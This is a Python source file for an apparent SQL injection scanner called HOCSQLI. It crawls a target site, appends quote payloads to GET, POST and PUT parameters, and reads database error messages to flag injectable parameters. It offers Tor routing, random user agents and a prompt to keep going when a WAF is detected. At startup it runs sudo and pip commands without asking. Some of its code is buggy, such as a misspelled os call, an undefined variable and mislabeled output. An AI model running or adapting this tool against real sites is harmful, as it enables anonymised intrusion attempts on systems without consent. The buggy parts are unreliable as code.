#!/usr/bin/env python3
import sys
import re
import sys
import binascii
import os
import datetime
from threading import Thread
from queue import Queue
from random import randint
from re import search,findall
from base64 import b64encode
from time import sleep
from multiprocessing import Process
try:
    from fake_useragent import UserAgent
except ImportError:
    os.system('pip3 install fake-useragent')
try:
    import requests, json
    from requests import get,post,put,packages
except ImportError:
    os.system('pip3 install requests')
try:
    from urllib.parse import urljoin,urlparse
except ImportError:
     from urlparse import urljoin
try:
    from bs4 import BeautifulSoup as bs
except ImportError:
    print ('BeautifulSoup isn\'t installed, installing now.')
    os.system('pip3 install beautifulsoup4 --upgrade')
try:
    os.system('sudo service tor start')
    
except ImportError:
    print ('sudo service tor start is not working')
    os.ststem('apt install tor')
    os.system('sudo service tor start')

# normal colors
red = '\u001b[31m'
green = '\u001b[32m'
yellow = '\u001b[33m'
blue = '\u001b[34m'
magenta = '\u001b[35m'
cyan = '\u001b[36m'
white = '\u001b[37m'

plin= "--" * 50
depth = 10
time = str(datetime.datetime.now())
keybordexcpt = ' Keyboard Interruption! Exiting... \n'
exit = ' Press CTRL + C  or CTRL + Z for EXIT'
retrypls =' Failed to establish a new connection Name or service not known'
presskey=' Press a key to continue '
wrongkey = ' Wrong Key Enter Retry... Press enter'
visited=[]
ua = UserAgent(verify_ssl=False,use_cache_server=True)
packages.urllib3.disable_warnings()

#----------------------------------LOGO Output ---------------------------	
def intro():
	intro1 = green + '''
    ----------------------------------------------------------------------
        #    #   ####    #####   #####   ####	#	######
        #    #  #    #  #	#	##   #	#	  #
        #    #  #    #  #	#	# #  #	#	  #
        ######  #    #  #	 ####	#  # #	#	  #
        #    #  #    #  #	      #	#   ##	#	  #
        #    #  #    #  #	      #	#    #	#	  #
	#    #   ####    #####	 #####	 #### #	######	######        

        Version : 1.0
        Team Hackersonlineclub
        Website : https://hackersonlineclub.com
   ------------------------------------------------------------------------
  | HOCSQLI tool must be used for Knowledge & Research Purpose Only.       |
  | Usage of HOC SQLI for attacking targets without prior mutual consent   |
  | is illegal. It is the end user's responsibility to obey all applicable |
  | local, state and federal laws. Developers assume no liability and are  |
  | not responsible for any misuse or damage caused by this program.       |
   ------------------------------------------------------------------------
    ''' + '\n' + '\n' +magenta
	for c in intro1:
		print(c,end='')
		sys.stdout.flush()
		sleep(0.00095)

class PL:
	@classmethod
	def inforI(self,text):
 		print(blue +" [#] " + text + cyan) 
	@classmethod
	def inforG(self,text):
		print(white + time + green + " [#] " + text + cyan)
	@classmethod
	def inforY(self,text):
 		print(white + time + yellow + " [!] " + text + cyan)
	@classmethod
	def inforR(self,text):
 		print(white + time + red + " [!] " + text + cyan)
	@classmethod
	def bug(self,bug,payload,method,parameter,target,link):
			print(white + time + red + " [!] Bug :" +bug + cyan)
			print(white + time + red + " [!] Payload:" +payload + cyan)
			print(white + time + red + " [!] parameter:" +method + cyan)
			print(white + time + red + " [!] Method:" +parameter + cyan)
			print(white + time + red + " [!] Data:" +target + cyan)
			print(white + time + red + " [!] Target:" +link + cyan)
			print(plin)

#--------------------------------- TOR SESSION --------------------------------------
def get_session(TOR,cookie):
	session = requests.session()# Request Session
	if(TOR == True): #if want to use tor set proxies
		session.proxies = {}
		session.proxies['http']='socks5h://127.0.0.1:9050'
		session.proxies['https']='socks5h://127.0.0.1:9050'
	else:
		proxies = None # without tor 
		session.proxies = proxies
	session.headers=ua
	if(cookie==False):
		return session #return session without cookie
	else:
		try:
			session.cookies.update(json.loads(cookie))#return session with cookie 
		except:
			return session  #return session without cookie
		return session
#--------------------------------- Encode -------------------------------------------
def en(data):
    d = ''
    for word in data:
        d += '%' + binascii.b2a_hex(word.encode('utf-8')).decode('utf-8')
    return d
def post_d(params):
    try:
        if params:
            prePostData = params.split("&")
            postData = {}
            for d in prePostData:
                p = d.split("=", 1)
                postData[p[0]] = p[1]
            return postData
        return {}
    except:
        return 0

sqli_p=['"',"'"]
sql_err = {'sqlite3':'sqlite3.OperationalError','MySQL': 'error in your SQL syntax','MiscError': 'mysql_fetch','MiscError2': 'num_rows','Oracle': 'ORA-01756','JDBC_CFM': 'Error Executing Database Query','JDBC_CFM2': 'SQLServer JDBC Driver','MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server','MSSQL_Uqm': 'Unclosed quotation mark','MS-Access_ODBC': 'ODBC Microsoft Access Driver','MS-Access_JETdb': 'Microsoft JET Database','Error Occurred While Processing Request' : 'Error Occurred While Processing Request','unkown' : 'Server Error','Microsoft OLE DB Provider for ODBC Drivers error' : 'Microsoft OLE DB Provider for ODBC Drivers error','Invalid Querystring' : 'Invalid Querystring','OLE DB Provider for ODBC' : 'OLE DB Provider for ODBC','VBScript Runtime' : 'VBScript Runtime','ADODB.Field' : 'ADODB.Field','BOF or EOF' : 'BOF or EOF','ADODB.Command' : 'ADODB.Command','JET Database' : 'JET Database','mysql_fetch_array()' : 'mysql_fetch_array()','Syntax error' : 'Syntax error','mysql_numrows()' : 'mysql_numrows()','GetArray()' : 'GetArray()','Fatal error': 'Fatal error','FetchRow()' : 'FetchRow()','Input string was not in a correct format' : 'Input string was not in a correct format','Internal Server Error':'The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application'}


class save_r:
    def save(request):
        global r
        r = request
        return r
    def get():
        return r
#--------------------------------- Method attackon links ----------------------------------      
class Method_sqli:
    def Get(url):
        for param in url.split('?')[1].split('&'):
            for payload in sqli_p:
                r = START.Get(url)
                if r == 0:
                    break
                save_r.save(r)
                req = START.Get(url.replace(param,param + en(payload)))
                if req == 0:
                    break
                for n,e in sql_err.items():
                    r2 = findall(e.encode('utf-8'),save_r.get().content)
                    r3 = findall(e.encode('utf-8'),req.content)
                    if len(r2) < len(r3):
                    	bug='SQL injection'
                    	payload=payload
                    	method='GET'
                    	parameter=param
                    	target=url.split('?')[0]
                    	link=url.replace(param,param + en(payload))
                    	PL.bug(bug,payload,method,parameter,target,link)
                    	break
    def Post(url):
        for param in url.split('?')[1].split('&'):
            for payload in sqli_p:
                d = post_d(urlparse(url).query)
                if d == 0:
                    break
                r = START.Post(url,post_d(urlparse(url).query))
                if r == 0:
                    break
                save_r.save(r)
                data = urlparse(url.replace(param,param + payload)).query
                req = START.Post(url.split('?')[0],post_d(data))
                if req == 0:
                    break
                for n,e in sql_err.items():
                    r = findall(e.encode('utf-8'),save_r.get().content)
                    r2 = findall(e.encode('utf-8'),req.content)
                    if len(r) < len(r2):
                    	bug='SQL injection'
                    	payload=payload
                    	method='POST'
                    	parameter=param
                    	target=url.split('?')[0]
                    	link=data
                    	PL.bug(bug,payload,method,parameter,target,link)
                    	break
    def Put(url):
        for param in url.split('?')[1].split('&'):
            for payload in sqli_p:
                if post_d(urlparse(url).query) == 0:
                    break
                r = START.Put(url,post_d(urlparse(url).query))
                if r == 0:
                    break
                save_r.save(r)
                data = urlparse(url.replace(param,param+payload)).query
                req = START.Put(url.split('?')[0],post_d(data))
                if req == 0:
                    break
                for n,e in sql_err.items():
                    r = findall(e.encode('utf-8'),save_r.get().content)
                    r2 = findall(e.encode('utf-8'),req.content)
                    if len(r) < len(r2):
                    	bug='SQL injection'
                    	payload=payload
                    	method='PUT'
                    	parameter=param
                    	target=url.split('?')[0]
                    	link=data
                    	PL.bug(bug,payload,method,parameter,target,link)
                    	break
#--------------------------------- Start testing of links ----------------------------------
class START:
    def __init__():
        pass
    def Setup(redirect=False,cookie=None,header={},timeout=None,proxies=None,random_agents=None):
        global cookies,headers,Timeout,random_Agents,allow_redirects,proxy
        allow_redirects = redirect
        cookies = cookie
        headers = header
        proxy = proxies
        random_Agents = random_agents
        Timeout = timeout
        return {
                'redirect':allow_redirects,
                'cookies':cookies,
                'headers':headers,
                'timeout':Timeout,
                'proxy':proxy,
                'random_agents':random_Agents
                }
    def Update(redirect=False,cookie=None,header={},timeout=None,proxies=None,random_agents=None):
        global allow_redirects,cookies,Timeout,random_Agents,proxy,headers
        update = {}
        if redirect:
            allow_redirects = redirect
            update['redirect'] = redirect
        if cookie:
            cookies = cookie
            update['cookies'] = cookie
        if header:
            headers = header
            update['headers'] = header
        if proxies:
            proxy = proxies
            update['proxy'] = proxies
        if random_agents:
            random_Agents = random_agents
            update['random_agents'] = random_agents
        if timeout:
            Timeout = timeout
            update['timeout'] = timeout
        return update
    def Get(url):
        try:
            if random_Agents:
                headers['User-agent'] = ua.random
            r = get(url,allow_redirects=allow_redirects,cookies=cookies,headers=headers,timeout=Timeout,proxies=proxy,verify=False)
            return r
        except:
            return 0
    def Post(url,data):
        try:
            if random_Agents:
                headers['User-agent'] = ua.random
            r = post(url,allow_redirects=allow_redirects,cookies=cookies,headers=headers,timeout=Timeout,data=data,proxies=proxy,verify=False)
            return r
        except:
            return 0
    def Put(url,data):
        try:
            if random_Agents:
                headers['User-agent'] = ua.random
            r = put(url,allow_redirects=allow_redirects,cookies=cookies,headers=headers,timeout=Timeout,data=data,proxies=proxy,verify=False)
            return r
        except:
            return 0



#--------------------------------- Get links ----------------------------------
def links_to_page(base,TOR,cookie):
	session = get_session(TOR,cookie) #Getting session 
	lt=[]	#list 
	text=session.get(base).text #Getting page content  
	visit=bs(text,"html.parser")	#beautifulsoup  extract html parse 
	for objects in visit.find_all("a",href=True):
		url=objects["href"]
		if url.startswith("http://") or url.startswith("https://"):
			continue
		elif url.startswith("mailto:") or url.startswith("javascript:"):
			continue
		elif urljoin(base,url) in visited:
			continue
		else:
			lt.append(urljoin(base,url))
			visited.append(urljoin(base,url))
	return lt #returl urls 
#--------------------------------- Start Attack ----------------------------------
def scan_SQLI(url,TOR,cookie,Random,redirect):
	if '?' in url and '=' in url:
		PL.inforY(' URL Found For Testing :- '+ str(url))
		SQLMENUAttack(str(url),TOR,cookie,Random,redirect)
	else:
		PL.inforY(' New Url Found But Not For Testing :- '+ str(url))
	
#--------------------------------- Crawl Website ----------------------------------
def crawl(url,depth,TOR,cookie,Random,redirect):
	urls=links_to_page(url,TOR,cookie) #Extract link from the page
	for url in urls:
		p=Process(target=scan_SQLI, args=(url,TOR,cookie,Random,redirect)) 	#scan_xss(url,payload,TOR,cookie)
		p.start()
		p.join()
		if depth != 0:
			crawl(url,depth-1,TOR,cookie,Random,redirect) # Website crawling  
		else:
			break	
def H_sqli(q):
    while True:
        item = q.get()
        Method_sqli.Get(item)
        Method_sqli.Post(item)
        Method_sqli.Put(item)
        q.task_done()

def SQLMENUAttack(url,TOR,cookie,Random,redirect):
	if(TOR == True):#user want to use TOR 
		proxy = {
		'http':'socks5h://127.0.0.1:9050',
		'https':'socks5h://127.0.0.1:9050'
		}
		
	else:
		proxy = None
	b = Queue()
	thr = 20
	timeout = 10
	Header = {}
	all_options = {
		'proxy':proxy,
		'cookie':cookie,
		'timeout':timeout,
		'Headers':Header,
		'random-agent':Random,
		'threads':thr,
		'url':[],
			}
	START.Setup(proxies=proxy,cookie=cookie,timeout=timeout,random_agents=Random,header=Header,redirect=redirect)
	all_options['url'].append(url)
	for i in range(thr):
		p2 = Thread(target=H_sqli,args=(b,))
		p2.daemon = True
		p2.start()
	for url in all_options['url']:
		url = url.rstrip()
	if '?' in url and '=' in url:
		b.put(url)
	b.join()

#----------------------------------- Inputs from user -------------------------------------

def SQLIENTRURLPAYLOAD(TOR, OPTION):
	coe=False
	ses = get_session(TOR,coe)#call session (TOR=Trure/False, cookie=False)
	print('Example: example.com/product.php?id=1')
	url = input("Enter the url :- ")
	try:
		if ("https://" not in url and "http://" not in url):
			url = "http://{}".format(url)
	except Exception as e:
		print(str(e))
		sys.exit(1)
	try:	
		PL.inforI(" Please wait getting response from website....")
		r=ses.get(url)
		PL.inforI(" Establish a new connection status code:- "+ str(r.status_code))
		ya = str(r.status_code)#set status code
		if(int(ya)>=400):
			if(ya==404): #for page not found
				PL.inforI(retrypls)
				PL.inforI(presskey)
				input()
				SQLIENTRURLPAYLOAD(TOR, OPTION)
			elif(ya==500): # for server 
				PL.inforI(retrypls)
				PL.inforI(presskey)
				input()
				SQLIENTRURLPAYLOAD(TOR, OPTION)
			else:#WAF detected
				PL.inforI(" WAF DETECTED :- " + str(r.status_code))
				waf= input(" Want to continue Y/N :-  ")
				if(waf == 'y' or waf == 'Y'):
					pass
				else:
					PL.inforI(retrypls)
					PL.inforI(presskey)
					input()
					SQLIENTRURLPAYLOAD(TOR, OPTION)#user input calling
	except Exception as e:
		PL.inforI(retrypls)
		print(str(e))
		PL.inforI(presskey)
		input()
		SQLIENTRURLPAYLOAD(TOR, OPTION)#user input calling
	cook = input("Want to set cookie Y/N :- ")
	if(cook == "y" or cook=="Y"): #if want to use cookie 
		PL.inforI(' Example :- {"ID":"1234567890"}')
		cookies = input("Enter cookie :- ")
		cookies = post_d(cookies)
		if cookie == 0:
			PL.inforR('invalid data')
			input()
			SQLIENTRURLPAYLOAD(TOR, OPTION)
	else:
		cookies = False#without  cookie
		
	Ran = input("Want to use Random user agent Y/N :- ")
	if(Ran == "y" or Ran=="Y"): #if want to use Random user agent 
		Random = True
	else:
		Random = False
	redir = input("Want to Follow Redirects  Y/N :- ")
	if(redir == "y" or redir=="Y"): #if want to use redirect 
		redirect = True
	else:
		redirect = False
	if (TOR == True):#user want to use TOR 
		try:
			s = get_session(TOR,cookies) #call Session (TOR=true, cookie) 
			PL.inforG( " New IP :-  {}".format(s.get("http://httpbin.org/ip").json()["origin"]))#call current ip 
		except:
			PL.inforR('Please check the network connection')
			PL.inforI(presskey)
			input()
			SQLIENTRURLPAYLOAD(TOR, OPTION) #call Inputs from user
	
	if (TOR == False):#without tor
		try:
			s = get_session(TOR,cookies)#call Session (TOR=False, cookie) 
			PL.inforG( " Current IP :-  {}".format(s.get("http://httpbin.org/ip").json()["origin"]))#call TOR ip
		except:
			PL.inforR('Please check the network connection')
			PL.inforI(presskey)#exception for connection 
			input()
			SQLIENTRURLPAYLOAD(TOR, OPTION) #call Inputs from user
	if(OPTION == 1):
		SQLMENUAttack(url,TOR,cookies,Random,redirect)
	else:
		crawl(url,depth,TOR,cookies,Random,redirect)#call crawler

	
#----------------------------------- SQLI01 function (without TOR)------------------------------
def SQL01():
	TOR = False
	os. system('clear')
	intro()#intro logo
	PL.inforI(' 1. Quick Scan {Scan only given url}')
	PL.inforI(' 2. Intensive Scan {Scan all links in the page}')
	PL.inforI(' 0. FOR GO BACK')
	PL.inforI(exit)	
	print('\n')
	SQL01_VAR = input('Enter your choice: >')	
	if(SQL01_VAR=="1"):
		OPTION = 1
		SQLIENTRURLPAYLOAD(TOR, OPTION)#call Inputs from user
		sys.exit(1)
	if(SQL01_VAR=="2"):
		OPTION = 2
		SQLIENTRURLPAYLOAD(TOR, OPTION) #call Inputs from user
		sys.exit(1)
	if(SQL01_VAR=="0"):
		SQLMENU() #BACK TO MENU
	if(SQL01_VAR !="1" and SQL01_VAR !="2" and SQL01_VAR !="0"):
		PL.inforR(wrongkey)
		input()
		SQL01()#recall xss without TOR
#----------------------------------- SQLI02 function (With TOR) --------------------------------
def SQL02():
	TOR = True
	os. system('clear')
	intro()#intro logo
	PL.inforI(' 1. Quick Scan {Scan only given url}')
	PL.inforI(' 2. Intensive Scan {Scan all links in the page}')
	PL.inforI(' 0. FOR GO BACK')
	PL.inforI(exit)
	print('\n')
	SQL02_VAR = input('Enter your choice: >')
	if(SQL02_VAR=="1"):
		OPTION = 1
		SQLIENTRURLPAYLOAD(TOR , OPTION)#call Inputs from user
		sys.exit(1)
	if(SQL02_VAR=="2"):
		OPTION = 2
		SQLIENTRURLPAYLOAD(TOR, OPTION) #call Inputs from user
		sys.exit(1)
	if(SQL02_VAR=="0"):
		SQLMENU() #BACK TO MENU XSS
	if(SQL02_VAR !="1" and SQL02_VAR !="2" and SQL02_VAR !="0"):
		PL.inforR(wrongkey)
		input()
		SQL02()#recall xss with TOR

#----------------------------------- SQLI MENU ---------------------------------------	
def SQLMENU():
	os. system('clear')
	intro()#intro logo
	PL.inforI(' 1. USE HOCSQLI WITHOUT TOR')
	PL.inforI(' 2. USE HOCSQLI WITH TOR')
	PL.inforI(exit)	
	print('\n')
	SQLMENU_VAR = input('Enter your choice: >')
	if(SQLMENU_VAR=="1"):
		SQL01() #USE TOR WITHOUT HOCSQLI
	if(SQLMENU_VAR=="2"):
		SQL02() #USE HOCSQLI WITH TOR
	if(SQLMENU_VAR !="1" and SQLMENU_VAR !="2"):
		PL.inforR(wrongkey)
		input()
		SQLMENU()#recall XSS menu
if __name__ == '__main__':

	try:
		SQLMENU()  #Calling main menu     
	except KeyboardInterrupt:
		print(keybordexcpt + '\n') #keyboard interruption
		sys.exit(1)
	except Exception as inst:
		print('Exception in __name__ == __main__ function')
		print(' [!] ',str(inst))#Error in code SS
		sys.exit(1)
